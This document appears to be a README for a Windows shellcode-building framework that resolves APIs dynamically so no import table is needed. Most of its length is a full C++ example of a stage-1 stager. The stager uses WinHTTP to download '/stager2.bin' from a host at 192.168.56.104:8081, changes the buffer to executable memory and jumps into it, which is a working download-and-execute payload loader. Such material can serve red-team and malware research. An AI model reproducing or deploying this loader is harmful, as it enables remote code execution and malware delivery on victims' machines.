## A simple and easy-to-use shellcode framework
### Structure description 
The api folder provides the get_function_address function and get_function_address_by_hash function to find the target function address. Please refer to the function signature for related parameters.
At the same time, this folder defines the structures and macro functions required in the framework (extracted from the mingw related header files). Theoretically, the relevant structures and macro functions defined in this folder have been adapted to the x64 platform
and x86 platforms, the x64 platform has been experimentally verified, and the x86 platform has yet to be verified. 

The frame folder provides the cmake function, the frame macro FRAME_FUNCTION, the preset function signature header file function_signature.h and the commonly used macro constant header file frame_constant_marco.h;
The cmake function is used to quickly compile exe, and objcopy is used to extract the assembly code of the .payload section in exe as the exported shellcode; the framework macro FRAME_FUNCTION is used to modify the function.
Export the function according to the C language convention and write the assembly code into the .payload section; 

The frame_api folder provides simple implementations of some basic functions. Currently, there are only frame_memcpy and frame_memset functions. These two functions have the same functions as the ordinary memcpy and memset functions. 

The hash folder provides hash calculation functions for dynamic addressing of the get_function_address and get_function_address_by_hash functions.

### Usage examples 
Clone this project locally, create a cpp file in the project root directory, define a function that implements shellcode logic in the file, and modify it with the FRAME_FUNCTION macro;
After implementing the relevant logic, call the prepared cmake function in CMakeLists.txt. The parameter list of the cmake function is (product name, entry function, cpp file where the entry function is located),
Just build it at the end. If you use the Clion compiler, after building, both exe files and bin files will be generated in the cmake-build-* directory. The bin file is the shellcode we need. 

Create the shellcode.cpp file, define the shellcode_entry function to implement shellcode logic, and finally set the cmake function parameters in CMakeLists.txt: 
(shellcode shellcode_entry shellcode.cpp)

```cpp
#include "frame/function_signature.h"
#include "frame/frame.h"
#include "frame/frame_constant_macro.h"
#include "api/api.h"
#include "frame_api/frame_api.h"

FRAME_FUNCTION void shellcode_entry(void) {
    constexpr char kernel32_dll[] = "kernel32.dll";
    constexpr char load_lib_a[] = "LoadLibraryA";
    constexpr char win_http_dll[] = "winhttp.dll";
    constexpr char win_http_open[] = "WinHttpOpen";
    constexpr char win_http_connect[] = "WinHttpConnect";
    constexpr char win_http_open_request[] = "WinHttpOpenRequest";
    constexpr char win_http_send_request[] = "WinHttpSendRequest";
    constexpr char win_http_receive_response[] = "WinHttpReceiveResponse";
    constexpr char win_http_query_data_available[] = "WinHttpQueryDataAvailable";
    constexpr char win_http_read_data[] = "WinHttpReadData";
    constexpr char win_http_close_handle[] = "WinHttpCloseHandle";
    constexpr char virtual_alloc[] = "VirtualAlloc";
    constexpr char virtual_protect[] = "VirtualProtect";
    constexpr char sleep[] = "Sleep";

    constexpr wchar_t host[] = L"192.168.56.104";
    constexpr wchar_t path[] = L"/stager2.bin";
    constexpr wchar_t user_agent[] = L"User Agent";
    constexpr wchar_t method[] = L"GET";
    constexpr uint16_t port = 8081;
    constexpr bool use_https = false;

    uint8_t* stager2 = nullptr;
    uint32_t stager2_size = 0;

    auto _LoadLibraryA = reinterpret_cast<fn_load_library_a>(
        get_function_address(kernel32_dll, load_lib_a));

    _LoadLibraryA(win_http_dll);

    auto _WinHttpOpen = reinterpret_cast<fn_win_http_open>(
        get_function_address(win_http_dll, win_http_open));
    auto _WinHttpConnect = reinterpret_cast<fn_win_http_connect>(
        get_function_address(win_http_dll, win_http_connect));
    auto _WinHttpOpenRequest = reinterpret_cast<fn_win_http_open_request>(
        get_function_address(win_http_dll, win_http_open_request));
    auto _WinHttpSendRequest = reinterpret_cast<fn_win_http_send_request>(
        get_function_address(win_http_dll, win_http_send_request));
    auto _WinHttpReceiveResponse = reinterpret_cast<fn_win_http_receive_response>(
        get_function_address(win_http_dll, win_http_receive_response));
    auto _WinHttpQueryDataAvailable = reinterpret_cast<fn_win_http_query_data_available>(
        get_function_address(win_http_dll, win_http_query_data_available));
    auto _WinHttpReadData = reinterpret_cast<fn_win_http_read_data>(
        get_function_address(win_http_dll, win_http_read_data));
    auto _WinHttpCloseHandle = reinterpret_cast<fn_win_http_close_handle>(
        get_function_address(win_http_dll, win_http_close_handle));
    auto _VirtualAlloc = reinterpret_cast<fn_virtual_alloc>(
        get_function_address(kernel32_dll, virtual_alloc));
    auto _VirtualProtect = reinterpret_cast<fn_virtual_protect>(
        get_function_address(kernel32_dll, virtual_protect));
    auto _Sleep = reinterpret_cast<fn_sleep>(
        get_function_address(kernel32_dll, sleep));

    void* session = nullptr;
    void* connect = nullptr;
    void* request = nullptr;

     session = _WinHttpOpen(
        user_agent,
        FRAME_WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        nullptr,
        nullptr,
        0);

    if (!session) {
        goto cleanup;
    }

    connect = _WinHttpConnect(
        session,
        host,
        port,
        0);

    if (!connect) {
        goto cleanup;
    }

    request = _WinHttpOpenRequest(
        connect,
        method,
        path,
        nullptr,
        nullptr,
        nullptr,
        use_https ? FRAME_WINHTTP_FLAG_SECURE : 0);

    if (!request) {
        goto cleanup;
    }

    if (!_WinHttpSendRequest(
        request,
        nullptr,
        0,
        nullptr,
        0,
        0,
        0)) {
        goto cleanup;
    }

    if (!_WinHttpReceiveResponse(request, nullptr)) {
        goto cleanup;
    }

     stager2 = static_cast<uint8_t*>(_VirtualAlloc(
        nullptr,
        1024 * 1024 * 30,
        FRAME_MEM_COMMIT | FRAME_MEM_RESERVE,
        FRAME_PAGE_READWRITE));
    frame_memset(stager2, 0, 1024 * 1024 * 30);

    while (true) {
        uint32_t available_bytes = 0;

        if (!_WinHttpQueryDataAvailable(request, &available_bytes)) {
            goto cleanup;
        }

        if (available_bytes == 0) {
            goto cleanup;
        }

        uint32_t read_bytes = 0;

        if (!_WinHttpReadData(
            request,
            stager2 + stager2_size,
            available_bytes,
            &read_bytes)) {
            goto cleanup;
        }

        stager2_size += read_bytes;

    }

cleanup:
    if (session) {
        _WinHttpCloseHandle(session);
    }
    if (connect) {
        _WinHttpCloseHandle(connect);
    }
    if (request) {
        _WinHttpCloseHandle(request);
    }

    if (stager2 && stager2_size > 0) {
        uint32_t old_protected_bytes = 0;
        _VirtualProtect(static_cast<void*>(stager2), stager2_size, FRAME_PAGE_EXECUTE_READ, &old_protected_bytes);
        reinterpret_cast<void(*)()>(stager2)();
        _Sleep(FRAME_INFINITE);
    }
}
```

### Finally 
Most of the basic ideas for implementing the shellcode framework are the same. Dynamic addressing is used to find the corresponding function address, and finally the function is called through a function pointer to avoid the introduction of import tables and other contents that lead to shellcode dependencies.
Process context or related PE initialization. The shellcode_frame project's idea of obtaining the currently loaded DLL is based on the https://github.com/jackullrich/ShellcodeStdio project. Thanks to the author of this project.
ideas provided.
